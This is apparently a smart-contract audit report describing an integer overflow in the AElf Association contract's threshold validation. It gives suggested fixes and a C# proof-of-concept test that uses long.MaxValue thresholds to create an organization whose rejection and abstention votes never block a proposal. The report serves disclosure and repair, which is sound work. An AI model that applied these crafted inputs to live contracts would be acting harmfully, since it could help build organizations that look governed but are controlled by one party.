# Audit Report

## Title
Integer Overflow in Association Organization Threshold Validation Bypasses Governance Controls

## Summary
The `CreateOrganization` function validates threshold values using unchecked arithmetic that can overflow when `MaximalAbstentionThreshold` or `MaximalRejectionThreshold` are set near `long.MaxValue`. This overflow causes validation to incorrectly pass, allowing creation of organizations where rejection and abstention votes become meaningless, requiring only minimal approvals to execute proposals.

## Finding Description

The vulnerability exists in the organization validation logic. When creating an organization, the `CreateOrganization` function calls `Validate(organization)` to verify threshold parameters. [1](#0-0) 

The validation performs arithmetic addition of threshold values without overflow protection. [2](#0-1)  The critical checks at lines 77-80 perform unchecked additions that can overflow in C#.

The threshold fields are defined as `int64` (C# `long`) types in the protobuf schema. [3](#0-2) 

**Root Cause**: In C#, integer arithmetic is unchecked by default. When `MaximalAbstentionThreshold = long.MaxValue` (9,223,372,036,854,775,807) and `MinimalApprovalThreshold = 1`, the addition overflows to `-9,223,372,036,854,775,808`, which is less than any positive member count, causing validation to pass incorrectly.

**Governance Bypass Mechanism**: During proposal release, the contract checks rejection and abstention thresholds. [4](#0-3)  With thresholds set to `long.MaxValue`, these checks always evaluate to false since actual vote counts can never exceed `long.MaxValue`, effectively disabling rejection and abstention mechanisms.

## Impact Explanation

**Governance Bypass**: An attacker can create an Association organization with thresholds that disable rejection and abstention voting mechanisms. During proposal release:
- `IsProposalRejected` checks if `rejectionMemberCount > long.MaxValue` - always false
- `IsProposalAbstained` checks if `abstentionMemberCount > long.MaxValue` - always false  
- Only `MinimalApprovalThreshold` (e.g., 1) approvals needed

**Concrete Impact**:
- Proposals can be released with minimal approvals regardless of rejections/abstentions
- Multi-signature governance controls completely bypassed
- Attacker can execute arbitrary contract calls through the organization's virtual address
- Any contracts or assets controlled by such organizations are at risk

**Severity**: Medium/High - This undermines the core governance mechanism, allowing unauthorized execution of proposals. While it requires creating a new organization (not compromising existing ones), any assets or control delegated to such organizations are vulnerable.

## Likelihood Explanation

**Attack Complexity**: Trivial - requires only calling `CreateOrganization` with crafted threshold values (`long.MaxValue`).

**Attacker Capabilities**: Any user can exploit this as `CreateOrganization` is a public method with no authorization checks. [1](#0-0)  The malicious threshold values are valid within the protobuf `int64` specification.

**Feasibility**: Extremely high - can be executed in a single transaction with no special privileges or pre-conditions.

**Detection Difficulty**: High - the malicious organization appears to have valid threshold values in storage (large positive numbers), making detection difficult without analyzing the overflow scenario.

**Probability**: High for targeted attacks where an attacker wants to create a governance structure that appears legitimate but is under unilateral control.

## Recommendation

Add upper bound validation on threshold values before performing arithmetic operations:

```csharp
private bool Validate(Organization organization)
{
    // ... existing checks ...
    
    var proposalReleaseThreshold = organization.ProposalReleaseThreshold;
    var organizationMemberCount = organization.OrganizationMemberList.Count();
    
    // Add upper bound checks before arithmetic
    if (proposalReleaseThreshold.MaximalAbstentionThreshold > organizationMemberCount ||
        proposalReleaseThreshold.MaximalRejectionThreshold > organizationMemberCount)
        return false;
    
    // Original checks can now safely use addition without overflow
    return proposalReleaseThreshold.MinimalVoteThreshold <= organizationMemberCount &&
           proposalReleaseThreshold.MinimalApprovalThreshold <= proposalReleaseThreshold.MinimalVoteThreshold &&
           proposalReleaseThreshold.MinimalApprovalThreshold > 0 &&
           proposalReleaseThreshold.MaximalAbstentionThreshold >= 0 &&
           proposalReleaseThreshold.MaximalRejectionThreshold >= 0 &&
           proposalReleaseThreshold.MaximalAbstentionThreshold +
           proposalReleaseThreshold.MinimalApprovalThreshold <= organizationMemberCount &&
           proposalReleaseThreshold.MaximalRejectionThreshold +
           proposalReleaseThreshold.MinimalApprovalThreshold <= organizationMemberCount;
}
```

Alternatively, use checked arithmetic context:
```csharp
checked
{
    return proposalReleaseThreshold.MaximalAbstentionThreshold +
           proposalReleaseThreshold.MinimalApprovalThreshold <= organizationMemberCount &&
           proposalReleaseThreshold.MaximalRejectionThreshold +
           proposalReleaseThreshold.MinimalApprovalThreshold <= organizationMemberCount;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task IntegerOverflow_BypassesGovernanceValidation()
{
    // Create organization with overflow-inducing thresholds
    var maliciousInput = new CreateOrganizationInput
    {
        OrganizationMemberList = new OrganizationMemberList
        {
            OrganizationMembers = { Reviewer1, Reviewer2 }
        },
        ProposalReleaseThreshold = new ProposalReleaseThreshold
        {
            MinimalApprovalThreshold = 1,
            MinimalVoteThreshold = 1,
            MaximalAbstentionThreshold = long.MaxValue,  // 9,223,372,036,854,775,807
            MaximalRejectionThreshold = long.MaxValue
        },
        ProposerWhiteList = new ProposerWhiteList
        {
            Proposers = { Reviewer1 }
        }
    };
    
    // Validation should fail but passes due to overflow
    // long.MaxValue + 1 = -9,223,372,036,854,775,808 (overflow)
    // -9,223,372,036,854,775,808 < 2 (member count) = true (incorrectly passes)
    var result = await AssociationContractStub.CreateOrganization.SendAsync(maliciousInput);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    var orgAddress = result.Output;
    var organization = await AssociationContractStub.GetOrganization.CallAsync(orgAddress);
    
    // Create a proposal
    var proposalInput = new CreateProposalInput
    {
        OrganizationAddress = orgAddress,
        ToAddress = TokenContractAddress,
        ContractMethodName = nameof(TokenContractStub.Transfer),
        Params = new TransferInput { Amount = 100 }.ToByteString(),
        ExpiredTime = TimestampHelper.GetUtcNow().AddDays(1)
    };
    
    var proposalResult = await Reviewer1AssociationContractStub.CreateProposal.SendAsync(proposalInput);
    var proposalId = proposalResult.Output;
    
    // Only 1 approval (Reviewer1), Reviewer2 rejects
    await Reviewer1AssociationContractStub.Approve.SendAsync(proposalId);
    await Reviewer2AssociationContractStub.Reject.SendAsync(proposalId);
    
    // Despite rejection, proposal can be released due to MaximalRejectionThreshold = long.MaxValue
    // rejectionCount (1) > long.MaxValue is always false
    var releaseResult = await Reviewer1AssociationContractStub.Release.SendAsync(proposalId);
    releaseResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Governance bypassed - proposal executed with only 1 approval despite 1 rejection
}
```

### Citations

**File:** contract/AElf.Contracts.Association/Association.cs (L69-94)
```csharp
    public override Address CreateOrganization(CreateOrganizationInput input)
    {
        var organizationHashAddressPair = CalculateOrganizationHashAddressPair(input);
        var organizationAddress = organizationHashAddressPair.OrganizationAddress;
        var organizationHash = organizationHashAddressPair.OrganizationHash;
        var organization = new Organization
        {
            ProposalReleaseThreshold = input.ProposalReleaseThreshold,
            OrganizationAddress = organizationAddress,
            ProposerWhiteList = input.ProposerWhiteList,
            OrganizationMemberList = input.OrganizationMemberList,
            OrganizationHash = organizationHash,
            CreationToken = input.CreationToken
        };
        Assert(Validate(organization), "Invalid organization.");
        if (State.Organizations[organizationAddress] == null)
        {
            State.Organizations[organizationAddress] = organization;
            Context.Fire(new OrganizationCreated
            {
                OrganizationAddress = organizationAddress
            });
        }

        return organizationAddress;
    }
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L34-45)
```csharp
    private bool IsProposalRejected(ProposalInfo proposal, Organization organization)
    {
        var rejectionMemberCount =
            proposal.Rejections.Count(organization.OrganizationMemberList.Contains);
        return rejectionMemberCount > organization.ProposalReleaseThreshold.MaximalRejectionThreshold;
    }

    private bool IsProposalAbstained(ProposalInfo proposal, Organization organization)
    {
        var abstentionMemberCount = proposal.Abstentions.Count(organization.OrganizationMemberList.Contains);
        return abstentionMemberCount > organization.ProposalReleaseThreshold.MaximalAbstentionThreshold;
    }
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L61-81)
```csharp
    private bool Validate(Organization organization)
    {
        if (organization.ProposerWhiteList.Empty() ||
            organization.ProposerWhiteList.AnyDuplicate() ||
            organization.OrganizationMemberList.Empty() ||
            organization.OrganizationMemberList.AnyDuplicate())
            return false;
        if (organization.OrganizationAddress == null || organization.OrganizationHash == null)
            return false;
        var proposalReleaseThreshold = organization.ProposalReleaseThreshold;
        var organizationMemberCount = organization.OrganizationMemberList.Count();
        return proposalReleaseThreshold.MinimalVoteThreshold <= organizationMemberCount &&
               proposalReleaseThreshold.MinimalApprovalThreshold <= proposalReleaseThreshold.MinimalVoteThreshold &&
               proposalReleaseThreshold.MinimalApprovalThreshold > 0 &&
               proposalReleaseThreshold.MaximalAbstentionThreshold >= 0 &&
               proposalReleaseThreshold.MaximalRejectionThreshold >= 0 &&
               proposalReleaseThreshold.MaximalAbstentionThreshold +
               proposalReleaseThreshold.MinimalApprovalThreshold <= organizationMemberCount &&
               proposalReleaseThreshold.MaximalRejectionThreshold +
               proposalReleaseThreshold.MinimalApprovalThreshold <= organizationMemberCount;
    }
```

**File:** protobuf/acs3.proto (L128-137)
```text
message ProposalReleaseThreshold {
    // The value for the minimum approval threshold.
    int64 minimal_approval_threshold = 1;
    // The value for the maximal rejection threshold.
    int64 maximal_rejection_threshold = 2;
    // The value for the maximal abstention threshold.
    int64 maximal_abstention_threshold = 3;
    // The value for the minimal vote threshold.
    int64 minimal_vote_threshold = 4;
}
```
